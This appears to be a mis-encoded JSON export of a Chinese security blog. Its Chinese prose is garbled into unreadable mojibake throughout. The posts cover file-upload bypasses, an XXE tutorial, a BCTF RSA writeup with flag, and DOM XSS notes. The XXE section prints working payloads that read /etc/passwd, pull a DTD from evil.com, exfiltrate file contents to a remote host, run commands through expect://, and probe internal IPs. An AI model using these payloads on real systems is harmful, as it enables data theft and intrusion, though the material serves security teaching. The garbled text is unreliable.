å¯¹æ‰©å±•åçš„æ£€æµ‹ &lt;ç”¨ burp ä¹‹ç±»çš„åå‘ä»£ç†å·¥å…·ç›´æ¥ POST æ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡å‰ç«¯æ£€æµ‹&gt; ç»•è¿‡æœåŠ¡ç«¯å¯¹ http request åŒ… MIME ç±»å‹æ£€æµ‹ &lt;ç”¨ burp ä¹‹ç±»çš„åå‘ä»£ç†å·¥å…·ä¼ªé€  POST æ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡ MIME æ£€æµ‹&gt; è·¯å¾„/æ‰©å±•åæ£€æµ‹ç»•è¿‡æ”»å‡» é»‘åå•ç»•è¿‡ æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ åå•åˆ—è¡¨ç»•è¿‡ ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ 0x00 æˆªæ–­ç»•è¿‡ .htaccess æ–‡ä»¶æ”»å‡» æœ¬åœ°åŒ…å«æ¼æ´ Apache è§£ææ¼æ´ IIS è§£ææ¼æ´ Nginx è§£ææ¼æ´ ç™½åå•ç»•è¿‡ 0x00 æˆªæ–­ç»•è¿‡ æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ IIS è§£ææ¼æ´ Nginx è§£ææ¼æ´ æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡æ”»å‡» æ–‡ä»¶åŠ è½½æµ‹è¯•ç»•è¿‡&lt;å¯¹æ–‡ä»¶è¿›è¡Œä»£ç æ³¨å…¥å†é…åˆä»»æ„è§£æè°ƒç”¨/æ¼æ´&gt;"},{"title":"XML External Entity(XXE)","permalink":"http://blog.0kami.cn/2016/06/28/old-old-xxe/","text":"æè¿°XMLçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œæ‘˜è‡ªsecurity.tencent.comXMLä¾‹å­1234567891011121314&lt;?xml version=\"1.0\" ?&gt; xmlå£°æ˜&lt;!DOCTYPE note[ æ–‡æ¡£ç±»å‹å®šä¹‰ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt; æ–‡æ¡£å…ƒç´ &lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Test&lt;/heading&gt;&lt;body&gt;This is a Test&lt;/body&gt;&lt;/note&gt; ä¸Šè¿°ä¸ºä¸€ä¸ªXMLçš„å®ä¾‹DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚ å†…éƒ¨å£°æ˜DTD&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt; å¼•ç”¨å¤–éƒ¨DTD&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;æˆ–è€…&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;public_ID&quot; &quot;æ–‡ä»¶å&quot;&gt;DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚ å†…éƒ¨å£°æ˜å®ä½“&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt; å¼•ç”¨å¤–éƒ¨å®ä½“&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;æˆ–è€…&lt;!ENTITY å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; æ¼æ´æè¿°æ‘˜è‡ªOWASP1An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. æ¼æ´æˆå› ä¸ºXMLè§£æå™¨é…ç½®ä¸å®‰å…¨æ—¶ï¼Œå½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚ è¯•éªŒæ¶æ„å¼•å…¥å¤–éƒ¨å®ä½“æ–¹å¼ï¼š æœ¬åœ°æ–‡ä»¶è¯»å– 12345&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; è¿œç¨‹æ–‡ä»¶è¯»å– 12345678&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % d SYSTEM \"http://evil.com/evil.dtd\"&gt; %d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;å…¶ä¸­evil.dtdæ–‡ä»¶å†…å®¹&lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt; ä½†æ˜¯å¦‚æœé‡åˆ°è¯»å–å¤šè¡Œçš„æ–‡ä»¶ï¼Œå¯èƒ½ä¼šè¯»ä¸å‡ºæ¥ï¼Œè¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸‹ftpæ¥å—xxeæ•°æ®ä¸åŒçš„è¯­è¨€é»˜è®¤æ”¯æŒçš„åè®®ä¸åŒ libxml2 php java .net filehttpftp filehttpftpphpcompress.zipcompress.bzip2dataglobphar httphttpsftpfilejarnetdocmailtogopher * httpfilehttpsftp ä¸Šè¿°ä¸ºé»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥é€šè¿‡æ‰©å±•æ”¯æŒå…¶ä»–åè®®ï¼Œå¦‚php scheme extension required httpsftps openssl zip zip ssh2.shellssh2.execssh2.tunnelssh2.sftpssh2.scp ssh2 rar rar ogg oggvorbis expect expect demo1 ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; demo2 ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®1234567891011121314$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/issue\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; %send;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);è¿œç¨‹DTDæ–‡ä»¶å†…å®¹&lt;!ENTITY % all \"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;\"&gt;%all; demo3 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"expect://id\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; æ‰§è¡ŒæˆåŠŸéœ€è¦phpçš„expectæ‰©å±• demo4 æ¢æµ‹å†…ç½‘åº”ç”¨123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"http://192.168.1.20:80\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; å¦‚æœä¸å­˜åœ¨è¯¥ipçš„åº”ç”¨ï¼Œä¼šæœ‰warning failed to open streamï¼Œé€šè¿‡è¿™ç§æ–¹å¼æ¢æµ‹å†…å®¹åº”ç”¨åŒæ—¶å¦‚æœæ‰¾åˆ°äº†å†…å®¹åº”ç”¨ï¼Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ”»å‡»å†…ç½‘åº”ç”¨ é˜²å¾¡æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³• PHPï¼šlibxml_disable_entity_loader(true); JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Pythonï¼šfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®å…³é”®è¯ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…ï¼ŒSYSTEMå’ŒPUBLICã€‚ jsonèŠ‚ç‚¹çš„Content-Type XXEæ”»å‡»å¦‚ä»Šå¾ˆå¤šwebåº”ç”¨ç¨‹åºä½¿ç”¨çš„éƒ½æ˜¯jsonæ ¼å¼çš„æ•°æ®ä¼ é€’ï¼Œé€šè¿‡åœ¨http requestå¤´ä¸­å¸¦å…¥Content-Type: application/jsonè¡¨æ˜ä¼ é€’çš„æ˜¯jsonæ ¼å¼çš„æ•°æ®ã€‚ä½†æ˜¯æœ‰æ—¶å€™æœåŠ¡å™¨å¯ä»¥æ¥å—å¼€å‘äººå‘˜æ²¡æœ‰æ„æ–™åˆ°çš„å…¶ä»–æ•°æ®æ ¼å¼ï¼Œå¦‚xmlæ ¼å¼ã€‚å¦‚æœæœåŠ¡å™¨å¯ä»¥æ¥å—xmlæ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½å­˜åœ¨xxeã€‚1234567891011121314151617HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/jsonContent-Length: 38&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; å°†å¦‚ä¸Šçš„Content-Typeæ”¹ä¸ºxmlæ ¼å¼çš„å†å‘é€123456789101112131415161718192021HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;netspitest&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; å¦‚æœè¿”å›çš„æ•°æ®æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå°±è¯´æ˜æœåŠ¡å™¨å¯ä»¥æ¥å—xmlæ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨xxeæ¥æ”»å‡»1234567891011121314151617181920212223242526HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 288&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 2467&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync.... ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„jsonèŠ‚ç‚¹éƒ½æ˜¯æ¥å—xmlæ ¼å¼çš„æ•°æ®çš„ã€‚æœ‰å¯èƒ½è¿”å›è§£æé”™è¯¯çš„æç¤ºæˆ–è€…415ä¸æ”¯æŒåª’ä½“ç±»å‹çš„é”™è¯¯æ¶ˆæ¯ å¸¦ä¸Šä¸€ä¸ªxxe-cheat-sheetï¼ŒDTD-Attackså‚è€ƒsecurity.tencent.comï¼Œ91ri.org"},{"title":"BCTF Crypto SpecialRSA writeup","permalink":"http://blog.0kami.cn/2016/03/20/old-old-CTF-BCTF-Crypto-SpecialRSA-writeup/","text":"é¢˜ç›®æè¿°å°†é™„å¸¦çš„zipæ–‡ä»¶ä¸‹è½½å¹¶è§£å‹ã€‚å¯ä»¥çœ‹åˆ°ä»¥ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼š åŠ å¯†ç®—æ³• ç¤ºä¾‹å¯†æ–‡ ç¤ºä¾‹æ˜æ–‡ åŠ å¯†çš„flagæ–‡ä»¶å¤§è‡´æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ï¼Œé¢˜ç›®çš„æ„å›¾ä¸ºé€šè¿‡ç¤ºä¾‹å¯†æ˜æ–‡ï¼Œç®—å‡ºåŠ å¯†ç§˜é’¥kï¼Œç„¶åé€šè¿‡kè§£å¯†flagæ–‡ä»¶ã€‚é˜…è¯»åŠ è§£å¯†ç®—æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºä»¥ä¸‹çš„æ•°å­¦å…¬å¼ï¼š12345gcd(k,N)=1,kd+Ny=1,c=&gt;criphertext,m=&gt;plaintext encode c=[(k^r%N)*m]%N decode m=[(d^r%N)*c]%N å·²çŸ¥2ç»„(m,r,c) N çš„å€¼ æ±‚è§£k åˆ°è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œä¸€ç›´æ²¡ä¸ªæ­£ç¡®çš„æ–¹å¼æ¥è·å–kï¼Œä¸ç”¨æ•°å­¦å°±ä¼šå¿˜è®°å•Šå•Šå•Šå•Šå•Šå•Šå•Šã€‚åæ¥æ±‚ç»„äº†è€å¸ˆï¼Œå¾—åˆ°äº†ä¸€ä¸ªæ€è·¯ã€‚12345678910ä¸‹é¢æ‰€æœ‰^-1è¡¨ç¤ºå¯¹åº”çš„ä¹˜æ³•é€†å…ƒ å‡è®¾gcd(r1,r2)=1,é‚£ä¹ˆå­˜åœ¨a,bä½¿å¾—å…¬å¼r1*a+r2*b=1 é‚£ä¹ˆ k^1 =k^(r1*a+r2*b) =k^(r1*a) * k^(r2*b) =(k^r1)^a * (k^r2)^bè€Œk^rn å¯ä»¥é€šè¿‡(m,r,c)å¯¹æ¥è·å¾—è¿™é‡Œç›´æ¥ä½¿ç”¨encodeå…¬å¼c=[(k^r%N)*m]%Né€šè¿‡æ¨å¯¼å¯ä»¥å¾—å‡ºk^r=c*(m^-1)mçš„é€†å…ƒå¯ä»¥é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾·ç®—æ³•æ¥æ±‚å¾— æœ‰äº†ä¸Šé¢çš„æ€è·¯ï¼Œå°±å¯ä»¥å†™ç¨‹åºæ¥åŠ è§£å¯†äº†ï¼Œè¿™é‡Œæˆ‘ç”¨äº†pythonæ¥å†™ï¼Œå…¶ä¸­(m,r,c)å¯¹æˆ‘äº‹å…ˆæ‹¿å‡ºæ¥äº†ï¼Œæ¸…æ¥šä¸€ç‚¹,ä¸‹é¢çš„ç¨‹åºæ˜¯æ¥ç®—kçš„123456789101112131415161718192021222324252627282930313233343536373839404142434445import msgpackfrom Crypto.PublicKey import RSAN = 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131Ldef Ext_Euclid (a , b ): ''' æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³• a*x + b*y = gcd(a,b) è¿”å› x,yä»¥åŠaï¼Œbçš„æœ€å¤§å…¬çº¦æ•°gcd :param a: :param b: :return:x,yä»¥åŠaï¼Œbçš„æœ€å¤§å…¬çº¦æ•°gcd ''' if (b == 0): return 1 , 0 , a else: x , y , q=Ext_Euclid( b , a % b ) x , y = y,( x - (a // b) * y ) return x , y , qm1=8246074182642091125578311828374843698994233243811347691229334829218700728624047916518503687366611595562099039411430662968666847086659721231623198995017758424796091810259884653332576136128144958751327844746991264667007359518181363522934430676655236880489550093852524801304612322373542296281962196795304499711006801211783005857297362930338978872451934860435597545642219213551685973208209873623909629278321181485010964460652298690058747090298312365230671723790850998541956664376820820570709272500330966205578898690396706695024001970727864091436518202414166919020415892764617055978488996164642229582717493375419993187360Lc1=14548997380897265239778884825381301109965518989661808090688952232381091726761464959572943383024428028270717629953894592890859128818839328499002950828491521254480795364789013196240119403187073307558598496713832435709741997056117831860370227155633169019665564392649528306986826960829410120348913586592199732730933259880469229724149887380005627321752843489564984358708013300524640545437703771424168108213045567568595093421366224818609501318783680497763353618110184078118456368631056649526433730408976988014678391205055298782061128568056163894010397245301425676232126267874656710256838457728944370612289985071385621160886Lm11=RSA.inverse(m1,N)# æ±‚é€†å…ƒkr1=m11*c1m2=15575051453858521753108462063723750986386093067763948316612157946190835527332641201837062951012227815568418309166473080588354562426066694924364886916408150576082667797274000661726279871971377438362829402529682825471299861814829463510659258586020732228351258291527965822977048954720558973840956731377322516168809373640494227129998871167089589689796024458501705704779109152762373660542684880052489213039920383757930855300338529058000330103359636123251274293258Lc2=12793942795110038319724531875568693507469327176085954164034728727511164833335101755153514030256152878364664079056565385331901196541015393609751624971554016671160730478932343949538202167508319292084519621768851878526657022981883304260886841513342396524869530063372782511380879783246034751883691295368172069170967975561364277514063320691930900258017293871754252209727301719207692321798229276732198521711602080244950295889575423383308099786298184477668302842952215665734671829249323604032320696267130330613134368640401070775927197554082071807605399448960911234829590548855031180158567578928333030631307816223152118126597Lm21=RSA.inverse(m2,N)kr2=m21*c2# print kr2r1=12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443Lr2=7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059La,b,_=Ext_Euclid(r1,r2)print aprint b# print a*r1+b*r2x1=RSA.inverse(kr2,N)k=(pow(kr1, a,N)*pow(x1,-b,N))%Nprint k é€šè¿‡ä¸Šé¢çš„ç¨‹åºå¯ä»¥ç®—å‡º k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961L æ¥ä¸‹æ¥å°±ç®€å•äº†å°†kå¸¦å…¥å®˜æ–¹çš„ç®—æ³•å°±å¯ä»¥å¾—åˆ°flag.BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}ä¸Šé¢ç¨‹åºä¸­éœ€è¦æ³¨æ„çš„æ˜¯powå‡½æ•°ä¸æ”¯æŒæŒ‡æ•°ä¸ºè´Ÿæ•°çš„æƒ…å†µï¼Œæ‰€ä»¥è¿˜è¦å†è½¬ä¸€ä¸‹å¼¯ã€‚ 1234a&gt;0,b&lt;0(k^r)^b=(k^-r)^-bæ‰€ä»¥å¯ä»¥å…ˆæ±‚å‡ºk^r mod Nçš„é€†å…ƒ æ€»ç»“æ•°å­¦æ–¹é¢çš„çŸ¥è¯†è¿˜æ˜¯çŸ­æ¿å•Šï¼Œä»¥åå¾—åŠ å¼ºä¸€ä¸‹:)"},{"title":"DOM XSS","permalink":"http://blog.0kami.cn/2016/03/17/old-old-DOM-XSS/","text":"å¼•è¨€ è¿™å‡ å¤©é˜…è¯»äº†ã€ŠWebå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜ã€‹ ï¼Œå¯¹DOMå‹çš„XSSè¿›è¡Œä¸€ä¸ªæ€»ç»“ï¼Œå†…å®¹ä¸»è¦ä¸ºä¹¦ä¸­æåˆ°çš„çŸ¥è¯†ç‚¹ï¼Œæ•´ç†æ•´ç†ä½œä»¥åå¤ä¹ æ‰€ç”¨ã€‚ DOMç±»å‹çš„XSSä¸åå°„å‹ã€å­˜å‚¨å‹XSSéƒ½ä¸åŒï¼ŒDOMå‹XSSä¸ç”¨æœåŠ¡å™¨ç«¯è§£æå“åº”çš„å‚ä¸ï¼Œè§¦å‘DOMå‹XSSå¯ä»¥è¯´ä¸»è¦ä¾é æµè§ˆå™¨å®¢æˆ·ç«¯çš„è§£æã€‚å¸¸è§çš„è¾“å‡ºç‚¹è§0x04é™„å½•ã€‚ DOMæ¸²æŸ“ é¦–å…ˆæˆ‘ä»¬æ¥ç†è§£ä¸€ä¸‹HTMLä¸Javascriptè‡ªè§£ç æœºåˆ¶ï¼ŒæŸ¥çœ‹ä»¥ä¸‹ä¸‰ä¸ªä¾‹å­123456789101112131. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;)&quot; /&gt;2. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;))&quot; /&gt;&lt;script&gt; function HtmlEncode(str) &#123; var s=&quot;&quot;; if(str.length==0) return &quot;&quot;; s=str.replace(/&amp;/g, &quot;&amp;amp;&quot;); s=str.replace(/&lt;/g, &quot;&amp;lt;&quot;); s=str.replace(/&gt;/g, &quot;&amp;gt;&quot;); s=str.replace(/\\&quot;/g, &quot;&amp;quot;&quot;); return s; &#125;3. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;img src=@ onerror=alert(123) /&amp;gt;&apos;)&quot; /&gt; å¯¹äºç¬¬ä¸€ç§æƒ…å†µï¼Œå¾ˆæ¸…æ¥šï¼Œç‚¹å‡»è¿™ä¸ªæŒ‰é’®åï¼Œä¼šå°†&lt;img src=@ onerror=alert(123) /&gt;å†™å…¥DOMä¸­ï¼Œå¹¶è§¦å‘alert(123)ã€‚è€Œç¬¬äºŒç§ä¸ç¬¬ä¸‰ç§ï¼Œdocument.writeçš„å†…å®¹éƒ½å˜æˆäº†&amp;lt;img src=@ onerror=alert(123) /&amp;gt;ï¼ŒåŒºåˆ«åœ¨äºä¸€ä¸ªæ˜¯åœ¨HTMLæ ‡ç­¾ä¸­,ä¸€ä¸ªæ˜¯é€šè¿‡Javascriptå¤„ç†åæ‰å˜æˆè¿™ä¸ªæ ·å­çš„ï¼Œé‚£ä¹ˆè¿™2ç§æƒ…å†µéƒ½ä¼šè§¦å‘å¼¹çª—å—ï¼Ÿç­”æ¡ˆæ˜¯ç¬¬äºŒç§ä¸ä¼šï¼Œè€Œç¬¬ä¸‰ç§ä¼šè§¦å‘ã€‚ å½¢æˆè¿™æ ·çš„åŸå› å°±æ˜¯å› ä¸ºHTMLä¸Javascriptè‡ªè§£ç æœºåˆ¶ï¼Œåœ¨HTMLæ ‡ç­¾ä¸­çš„javascriptå¯ä»¥è¿›è¡ŒHTMLå½¢å¼çš„ç¼–ç ã€‚åœ¨HTMLæ ‡ç­¾ä¸­çš„javascriptä»£ç ä¼šå…ˆè¢«HTMLå½¢å¼çš„ç¼–ç è¿›è¡Œè§£ç ï¼Œå³ç¬¬ä¸‰ç§æƒ…å†µä¸­&amp;lt;img src=@ onerror=alert(123) /&amp;gt;åœ¨javascriptè¿è¡Œå‰å·²ç»è§£ç ä¸º&lt;img src=@ onerror=alert(123) /&gt;ï¼Œè€Œç¬¬äºŒç§æƒ…å†µä¸ºjavascriptè¿è¡Œä¸­è¿›è¡Œçš„HTMLå½¢å¼çš„ç¼–ç ï¼Œæ‰€ä»¥å†™åˆ°DOMä¸­æ—¶ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚HTMLä¸­çš„ç¼–ç ï¼š è¿›åˆ¶ç¼–ç ï¼š&#xH;(åå…­è¿›åˆ¶æ ¼å¼)ã€&#D;(åè¿›åˆ¶æ ¼å¼),æœ€åçš„åˆ†å·å¯ä»¥ä¸è¦ HTMLå®ä½“ç¼–ç ï¼šå³ä¸Šé¢çš„é‚£ä¸ªHtmlEncode é‚£ä¹ˆåŒæ ·çš„ï¼Œåœ¨javascriptä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œå°†å†…å®¹æ”¹ä¸ºjavascriptçš„ç¼–ç ï¼ŒåŒæ ·ä¼šè‡ªè§£ç ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹ä¸€ä¸ªä¾‹å­12345678&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;&lt;script&gt; function $(id)&#123;return document.getElementById(id);&#125;; $(&apos;exec_btn&apos;).onclick=function()&#123; document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;); document.write(&apos;\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0040\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0032\\u0033\\u0029\\u0020\\u002f\\u003e&apos;); &#125; ä¸Šé¢2ä¸­writeå‡ºç°çš„ç»“æœæ˜¯ç›¸åŒçš„ï¼ŒåŒæ ·çš„é“ç†ï¼Œç”±äºä¸Šè¿°ç¼–ç ä¸ºjavascriptçš„ç¼–ç å½¢å¼ï¼Œå¹¶ä¸”åœ¨javascriptçš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œä¼šå…ˆè¿›è¡Œè§£ç ï¼Œå†è¿è¡Œjavascriptã€‚JavaScriptä¸­çš„ç¼–ç ï¼š Unicodeå½¢å¼ï¼š\\uH æ™®é€šåå…­è¿›åˆ¶ï¼š\\xH çº¯è½¬ä¹‰ï¼š\\â€™ã€\\â€ã€\\&lt;ã€>è¿™æ ·åœ¨ç‰¹æ®Šå­—ç¬¦å‰åŠ \\è¿›è¡Œè½¬ä¹‰ é€šè¿‡ä¸Šé¢å‡ ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨HTMLä¸­ä¸åœ¨Javascriptä¸­è‡ªåŠ¨è§£ç çš„å·®å¼‚ï¼Œå¦‚æœé˜²å¾¡æ²¡æœ‰åŒºåˆ†è¿™æ ·çš„åœºæ™¯ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚ ç†è§£äº†ä¸Šè¿°çš„è‡ªè§£ç æœºåˆ¶ï¼Œåœ¨ä¸åŒçš„æ ‡ç­¾ä¸‹ä¼šæœ‰ä¸åŒçš„ç»“æœï¼Œæ¯”å¦‚ä¸€ä¸‹å‡ ä¸ªæ ‡ç­¾ä¼šè‡ªå¸¦HtmlEncodeåŠŸèƒ½12345678&lt;title&gt;&lt;/title&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;noscript&gt;&lt;/noscript&gt;&lt;noframes&gt;&lt;/noframes&gt;&lt;textarea&gt;&lt;/textarea&gt;&lt;xmp&gt;&lt;/xmp&gt;&lt;plaintext&gt;&lt;/plaintext&gt; &lt;xmp&gt;æ²¡æœ‰HtmlEncodeåŠŸèƒ½ï¼Œ&lt;plaintext&gt;åœ¨Firefoxä¸‹ä¼šè¿›è¡ŒHtmlEncodeç¼–ç ï¼Œåœ¨chromeä¸‹ä¸ä¼šã€‚ DOM fuzzing ç›´æ¥çœ‹ä»£ç æŠŠ ä¸‹é¢çš„ç¨‹åºç”¨pythonç¼–å†™123456789101112131415161718192021222324252627282930313233def get_template(template_file): &quot;&quot;&quot;è·å–fuzzingçš„æ¨¡æ¿æ–‡ä»¶å†…å®¹&quot;&quot;&quot; content=&apos;&apos; with open(template_file) as f: content=f.read() return contentdef set_result(result_file,result): &quot;&quot;&quot;ç”Ÿæˆfuzzingç»“æœæ–‡ä»¶&quot;&quot;&quot; with open(result_file,&apos;w&apos;) as f: f.write(result)def fuzzing(fuzz_file,result_file): template=get_template(fuzz_file) fuzz_area_0=template.find(&apos;&lt;fuzz&gt;&apos;) fuzz_area_1=template.find(&apos;&lt;/fuzz&gt;&apos;) fuzz_area=template[fuzz_area_0+6:fuzz_area_1].strip() # chars=[] chars=[] for i in xrange(255): # ASCIIç›è½¬æ¢ä¸ºå­—ç¬¦ if i!=62: chars.append(chr(i)) fuzz_area_result=&apos;&apos; for c in chars: 